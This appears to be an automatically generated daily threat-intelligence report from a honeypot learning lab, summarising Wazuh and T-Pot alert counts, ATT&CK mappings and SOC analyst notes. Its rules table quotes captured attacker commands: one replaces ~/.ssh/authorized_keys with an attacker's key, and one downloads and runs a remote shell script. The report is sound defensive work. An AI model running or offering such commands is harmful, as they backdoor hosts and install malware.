# LearningLab01 Daily Threat Intelligence Report — 2026-09-23

Generated: 2026-09-23T13:15:05.062Z

Report window: 2026-09-22T13:15:05.035Z through 2026-09-23T13:15:05.035Z

> This report summarizes security telemetry and honeypot activity. An alert indicates that a rule matched observed activity; it does not automatically prove that a system was compromised.

## Executive Summary

| Metric | Count |
|---|---:|
| Wazuh alerts | 304,873 |
| Attack-related alerts | 17,771 |
| Honeypot interactions | 290,097 |
| Authentication failures | 5,145 |
| Authentication successes | 571 |
| Critical alerts | 255 |
| High alerts | 614 |
| T-Pot artifacts observed | 0 |
| Malicious artifact detections | 0 |

### Notable Observations

- 255 critical-severity alerts require priority review.
- 614 high-severity alerts should be reviewed after the critical queue.
- Authentication failures exceeded successful authentications by a ratio of 9.01:1.
- Country attribution currently covers only 1.07% of alerts. Country totals should be treated as partial telemetry.
- The most frequent rule was 110213: T-Pot RDP connection from [IP address] to port 3389. (154,750 alerts).

## Wazuh Security Monitoring

### Alert Severity

| Severity | Alerts | Percentage |
|---|---:|---:|
| Critical | 255 | 0.08% |
| High | 614 | 0.20% |
| Medium | 2,835 | 0.93% |
| Low | 301,169 | 98.79% |
| Informational | 0 | 0.00% |

Severity represents the priority assigned by the Wazuh rule. Critical and high alerts should be investigated first, but repeated lower-severity events can also reveal scanning, credential attacks, or attacker preparation.

### Authentication Activity

- Authentication failures: 5,145
- Authentication successes: 571
- Failure-to-success ratio: 9.01:1

A successful authentication is not considered an attack by itself. Analysts should correlate successful logins with preceding failures, source addresses, usernames, target systems, and expected activity.

### Attack-Type Breakdown

| Category | Alerts | Percentage of attack-related alerts |
|---|---:|---:|
| Network attack | 9,221 | 51.89% |
| Payload delivery | 9,221 | 51.89% |
| Authentication failure | 5,145 | 28.95% |
| Command execution | 2,386 | 13.43% |
| Reconnaissance | 343 | 1.93% |
| Network scan | 241 | 1.36% |
| Malware | 195 | 1.10% |
| Web attack | 127 | 0.71% |
| SMTP attack | 12 | 0.07% |

> Category counts may overlap because one Wazuh alert can belong to multiple rule groups. The attack-related total counts each alert once.

### Country of Origin

Wazuh supplied country information for 3,256 alerts, representing 1.07% of all alerts.

| Country | Alerts | Percentage of all alerts | Relative volume |
|---|---:|---:|---|
| Unknown | 301,617 | 98.93% | Not geolocated |
| New Zealand | 2,826 | 0.93% | ████████████████████ |
| United Kingdom | 169 | 0.06% | █ |
| United States | 93 | 0.03% | █ |
| Germany | 90 | 0.03% | █ |
| Ukraine | 22 | 0.01% | █ |
| Russia | 21 | 0.01% | █ |
| Denmark | 6 | 0.00% | █ |
| Sweden | 6 | 0.00% | █ |
| China | 3 | 0.00% | █ |
| France | 3 | 0.00% | █ |
| Japan | 3 | 0.00% | █ |
| Singapore | 3 | 0.00% | █ |
| Spain | 3 | 0.00% | █ |
| Canada | 2 | 0.00% | █ |
| Hungary | 2 | 0.00% | █ |
| Republic of Lithuania | 2 | 0.00% | █ |
| Romania | 1 | 0.00% | █ |
| Turkey | 1 | 0.00% | █ |

> Relative-volume bars compare only countries with known geographic attribution. Unknown alerts are excluded from the bar scale.

> Geolocation is approximate. VPNs, proxies, cloud providers, compromised hosts, carrier networks, and incomplete GeoIP coverage can make the apparent country different from the attacker’s location.

### MITRE ATT&CK Tactics

| Tactic | Alerts |
|---|---:|
| Defense Evasion | 292 |
| Initial Access | 291 |
| Persistence | 291 |
| Privilege Escalation | 291 |
| Lateral Movement | 97 |
| Credential Access | 69 |
| Impact | 37 |
| Execution | 18 |
| Command and Control | 11 |

### MITRE ATT&CK Techniques

| Technique | Alerts |
|---|---:|
| Valid Accounts | 291 |
| Remote Services | 97 |
| Brute Force | 69 |
| Stored Data Manipulation | 37 |
| Command and Scripting Interpreter | 18 |
| Ingress Tool Transfer | 11 |
| Disable or Modify Tools | 1 |

MITRE ATT&CK describes adversary behavior rather than declaring that an attack succeeded. These mappings help analysts connect individual alerts to possible attacker objectives and investigative hypotheses.

### Most Frequent Wazuh Rules

| Rule ID | Highest Level | Alerts | Description | Agents |
|---|---:|---:|---|---|
| 110213 | 4 | 154,750 | T-Pot RDP connection from [IP address] to port 3389. | tpot (154,750) |
| 110209 | 5 | 103,085 | T-Pot Conpot snmp event from [IP address]: SNMPv2 Bulk | tpot (103,085) |
| 110204 | 4 | 11,594 | T-Pot Honeytrap connection from [IP address] to port 5908 | tpot (11,594) |
| 110205 | 6 | 9,151 | T-Pot Honeytrap received a payload from [IP address] | tpot (9,151) |
| 110207 | 5 | 7,152 | T-Pot SentryPeer SIP activity from [IP address]:51940, method INVITE | tpot (7,152) |
| 110101 | 3 | 5,908 | Cowrie SSH connection from [IP address]. | tpot (5,908) |
| 110102 | 5 | 5,145 | Cowrie failed login from [IP address] using username root. | tpot (5,145) |
| 110219 | 4 | 3,157 | T-Pot CiscoASA web activity from [IP address]: "GET / HTTP/1.1" 200 - | tpot (3,157) |
| 110104 | 7 | 2,102 | Cowrie captured a command from [IP address]: w | tpot (2,102) |
| 110201 | 4 | 457 | T-Pot Dionaea pptpd connection from [IP address] to port 1723 | tpot (457) |
| 110103 | 10 | 280 | Cowrie accepted login from [IP address] using username root. | tpot (280) |
| 110109 | 13 | 255 | Cowrie captured a destructive, persistence, or defense-evasion command from [IP address]: cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~ | tpot (255) |
| 533 | 7 | 240 | Listened ports status (netstat) changed (new port opened or closed). | tpot (240) |
| 110214 | 9 | 236 | T-Pot RDP honeypot detected a connection burst from [IP address]. | tpot (236) |
| 5501 | 3 | 194 | PAM: Login session opened. | tpot (192), wazuh (2) |
| 110105 | 12 | 166 | Cowrie captured a file download from [IP address]. | tpot (166) |
| 5502 | 3 | 164 | PAM: Login session closed. | tpot (162), wazuh (2) |
| 110223 | 5 | 127 | T-Pot HoneyAML received  request from  to  on port . | tpot (127) |
| 110216 | 4 | 106 | T-Pot Mailoney received SMTP command from [IP address]:   | tpot (106) |
| 5715 | 3 | 97 | sshd: authentication success. | tpot (96), wazuh (1) |
| 110221 | 7 | 73 | T-Pot CiscoASA detected configuration discovery from [IP address]: "GET /SETTINGS.CFG HTTP/1.1" 404 - | tpot (73) |
| 110212 | 10 | 70 | T-Pot Honeytrap detected repeated payload activity from [IP address]. | tpot (70) |
| 110106 | 10 | 69 | Cowrie detected repeated failed logins from [IP address]. | tpot (69) |
| 110215 | 4 | 69 | T-Pot MiniPrint event: command_received, action request, Request received | tpot (69) |
| 510 | 7 | 41 | Host-based anomaly detection event (rootcheck). | wazuh (40), tpot (1) |
| 110220 | 8 | 34 | T-Pot CiscoASA captured a login request from [IP address]: "POST /login.cgi HTTP/1.1" 200 - | tpot (34) |
| 550 | 7 | 26 | Integrity checksum changed. | wazuh (18), tpot (8) |
| 110108 | 12 | 18 | Cowrie captured suspicious execution or staging activity from $(src_ip): $(input) | tpot (18) |
| 2904 | 7 | 18 | Dpkg (Debian Package) half configured. | wazuh (18) |
| 110208 | 7 | 14 | T-Pot SentryPeer detected SIP scanner friendly-scanner from [IP address]:38999 | tpot (14) |
| 110217 | 7 | 12 | T-Pot Mailoney captured suspicious SMTP activity from [IP address]: MAIL FROM:<hello@info.com>  | tpot (12) |
| 110107 | 12 | 11 | Cowrie captured a probable payload-retrieval command from [IP address]: cd /tmp 2>/dev/null \|\| cd /var 2>/dev/null \|\| cd /dev/shm 2>/dev/null \|\| cd /run 2>/dev/null \|\| cd /root 2>/dev/null \|\| cd /;rm -f kla.sh;wget -O kla.sh http://[IP address]/bins/kla.sh 2>/dev/null\|\|busybox wget -O kla.sh http://[IP address]/bins/kla.sh 2>/dev/null\|\|curl -sLo kla.sh http://[IP address]/bins/kla.sh 2>/dev/null;chmod 777 kla.sh;sh kla.sh telnet& | tpot (11) |
| 2902 | 7 | 11 | New dpkg (Debian Package) installed. | wazuh (11) |
| 592 | 8 | 11 | Log file size reduced. | tpot (11) |
| 86003 | 3 | 6 | Docker: Error message | tpot (6) |
| 110211 | 9 | 5 | T-Pot Dionaea detected a connection burst from [IP address]. | tpot (5) |
| 110222 | 9 | 3 | T-Pot CiscoASA detected repeated web requests from one source. | tpot (3) |
| 110218 | 9 | 2 | T-Pot Mailoney detected repeated SMTP activity from one source. | tpot (2) |
| 19004 | 7 | 2 | SCA summary: CIS Ubuntu Linux 24.04 LTS Benchmark v1.0.0.: Score less than 50% (47) | tpot (2) |
| 202 | 7 | 2 | Agent event queue is 90% full. | tpot (2) |
| 203 | 9 | 2 | Agent event queue is full. Events may be lost. | tpot (2) |
| 205 | 3 | 2 | Agent event queue is back to normal load. | tpot (2) |
| 11 | 4 | 1 | Unknown | tpot (1) |
| 19010 | 3 | 1 | CIS Ubuntu Linux 24.04 LTS Benchmark v1.0.0.: Ensure nftables default deny firewall policy.: Status changed from failed to passed | tpot (1) |
| 19011 | 9 | 1 | CIS Ubuntu Linux 24.04 LTS Benchmark v1.0.0.: Ensure nftables default deny firewall policy.: Status changed from passed to failed | tpot (1) |
| 503 | 3 | 1 | Wazuh agent started. | tpot (1) |
| 506 | 3 | 1 | Wazuh agent stopped. | tpot (1) |
| 591 | 3 | 1 | Log file rotated. | tpot (1) |

### New or Previously Unseen Detections

Historical novelty comparison is not enabled in the exporter yet. This section will compare the current report window with the preceding 30-day baseline. Until that comparison is enabled, no rule should be described as new solely because it appears in this report.

### SOC Analyst Learning Notes

1. Begin with critical and high alerts, but validate the underlying event.
2. Determine whether the event represents scanning, attempted access, payload delivery, execution, persistence, or impact.
3. Correlate source IP, username, target, timestamp, and related alerts.
4. Check whether a successful login followed repeated failures.
5. Separate honeypot interaction from activity against production assets.
6. Document evidence supporting both malicious and benign explanations.
7. Escalate based on confirmed risk, affected assets, and confidence—not alert volume alone.

## T-Pot Artifact Intelligence

### Artifact Summary

- Artifacts observed: 0
- Known hashes: 0
- Uploaded or analyzed: 0
- Malicious detections: 0
- Suspicious detections: 0
- Lookup errors: 0

### Artifacts

| SHA-256 | Bytes | Status | Malicious | Suspicious | Undetected | VirusTotal |
|---|---:|---|---:|---:|---:|---|
| No artifacts observed | — | — | — | — | — | — |

## Security Onion Network Monitoring

_Planned integration._

This section will eventually contain Suricata alerts, Zeek observations, network attack types, source-country information, targeted services, new network behaviors, and correlations with Wazuh endpoint alerts.

## Report Limitations

- Alert counts represent rule matches, not necessarily unique attackers.
- Attack-category counts may overlap.
- Honeypot traffic is intentionally exposed and is not equivalent to a compromise of a production system.
- GeoIP attribution is approximate and currently has incomplete coverage.
- VirusTotal results can change as vendors update their detections.

Generated automatically by the LearningLab01 threat-intelligence pipeline.
